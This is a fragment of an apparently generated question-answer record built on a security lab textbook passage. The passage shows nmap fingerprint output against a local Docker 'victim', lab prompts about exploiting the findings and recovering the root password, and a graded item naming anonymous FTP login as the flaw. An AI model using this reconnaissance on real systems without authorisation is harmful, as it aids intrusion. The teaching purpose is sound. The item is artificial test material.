fingerprint:\n\nOS:SCAN(V=7.70%E=4%D=9/22%OT=21%CT=1%CU=44136%PV=Y%DS=1%DC=D%G=Y%M=0242AC%T\n\nOS:M=614B95AE%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A\n\nOS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B\n\nOS:4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88\n\nOS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+\n\nOS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\n\nOS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A\n\nOS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D\n\nOS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4\n\nOS:0%CD=S)\n\nNetwork Distance: 1 hop\n\nTRACEROUTE\n\nHOP RTT     ADDRESS\n\n1   0.10 ms nmap_victim_1.nmap_default (172.20.0.3)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\nNmap done: 1 IP address (1 host up) scanned in 28.39 seconds</code></pre>\n\n</figure>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat additional information did you learn from the `-A`{.literal} option? How do you think this could be exploited?\n\n:::\n\n</aside>\n\nNow, using the `scanner`{.literal} container you are currently on see what you can find out about `victim`{.literal}.\n\n[This man page may be of some help.](https://linux.die.net/man/1/ftp){.link}\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: Remembering what you learned in the *Hash it Out* lab, what is the root password on the victim machine?\n\n:::\n\n</aside>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: How can you test to see if you got it right? What does this say about how ProFTP is configured on\n\n`victim`{.literal}?\n\n:::\n\n</aside>\n\nWhen you are all done poking around, you can exit the shell and run `docker-compose down`{.literal} to stop\n\n`victim`{.literal} from running in the background.\n\n:::::::::\n\n:::: {.section .sect2 title=\"4.6. Review Questions\"}\n", "topic": "Understanding how to identify and mitigate potential security vulnerabilities in FTP configurations.", "question": "Based on the provided context, what specific vulnerability was identified in the ProFTPD configuration on the \u2018victim\u2019 machine, and what evidence from the nmap scan supports this finding?", "answer": "Anonymous FTP login allowed (FTP code 230).", "explanation": "The nmap scan revealed that port 21/tcp, associated with FTP, was open and vulnerable, specifically due to the presence of anonymous FTP login allowed.", "question_token_count": 38, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 11, "choices": null}
